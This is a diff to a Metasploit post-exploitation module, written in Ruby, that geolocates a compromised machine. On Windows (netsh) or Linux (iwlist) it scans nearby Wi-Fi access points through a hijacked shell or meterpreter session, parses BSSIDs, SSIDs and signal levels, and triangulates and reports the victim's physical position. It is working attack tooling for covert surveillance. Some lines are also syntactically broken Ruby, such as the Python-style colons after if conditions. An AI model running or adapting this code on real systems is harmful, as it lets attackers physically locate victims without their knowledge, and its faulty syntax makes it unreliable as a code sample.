@@ -36,26 +36,50 @@ class Metasploit3 < Msf::Post
 				survey << "&wifi=mac:#{mac}%7Cssid:#{ssid}%7Css:#{rssi}"
 			end
 		end
-
+            
 		when /win/
 
-#### Need to do windows wlan for windows 7 | vista | 2008
-		print_status("WIN: cmd.exe /c netsh wlan show networks mode=bssid | findstr \"SSID Signal\"")
-		cmd = "ipconfig"
-		if session.type =~ /shell/
-			print_status("shell")
-			wdata << session.shell_command(cmd.chomp)
-		elsif session.type =~ /meterpreter/
-			winver = session.sys.config.sysinfo["OS"]
-			print_status(winver)
-			print_status("meterpreter")
-			wdata=cmd_exec(cmd)
-		end
-		print_status("wdata=#{wdata}")
-
+            # Check to make sure it is running against either Vista|7|8|2008
+            winver = session.sys.config.sysinfo["OS"]
+			affected = [ 'Windows Vista', 'Windows 7', 'Windows 2008', 'Windows 8' ]
+            vuln = false
+            affected.each { |v|
+                if winver.include? v
+                    vuln = true
+                end
+            }
+            if not vuln
+                print_error("Module does not work with #{winver}.")
+                return
+            end
+            
+            cmd = "netsh wlan show networks mode=bssid | findstr \"SSID Signal\""
+            if session.type =~ /shell/
+                wdata << cmd_exec(cmd.chomp)
+            elsif session.type =~ /meterpreter/
+                wdata=session.shell_command(cmd)
+            end
+            print_status("#{wdata}")
+            mac,rssi,ssid=nil
+            wdata.each do |line|
+                if (line.include? 'BSSID'):
+                    mac = line.slice(line.index(':')+1,line.length).gsub!(/\s+/, "")
+                elsif (line.include? 'SSID'):
+                        ssid = line.slice(line.index(':')+1,line.length).gsub!(/\s+/, "")
+                elsif (line =~ /([0-9]*%)/i)
+                    rssi = $1.gsub!("\%","")
+                    rssi = rssi.to_i * -1
+				end
+				if (mac and ssid and rssi)
+					survey << "&wifi=mac:#{mac}%7Cssid:#{ssid}%7Css:#{rssi}"
+                    mac, ssid, rssi=nil
+				end
+            end
+            
 		when /linux/
+            cmd = "/sbin/iwlist wlan0 scan | egrep 'Address|ESSID|Signal'"
 			if session.type =~ /shell/
-				wdata= session.shell_command("/sbin/iwlist wlan0 scan | egrep 'Address|ESSID|Signal'")
+				wdata= session.shell_command(cmd)
 			elsif session.type =~ /meterpreter/
 				wdata=cmd_exec(cmd)
 			end
@@ -105,10 +129,10 @@ end
 	end
 
 	def run
-
 		survey = wlan_survey()
 		pos = wlan_triangulate(survey)
-		report_results(pos,"msf_wlansurvey")
+        comment = "Geolocated with survey: #{survey}"
+		report_results(pos,"msf_wlansurvey",comment)
 	end
 
 end
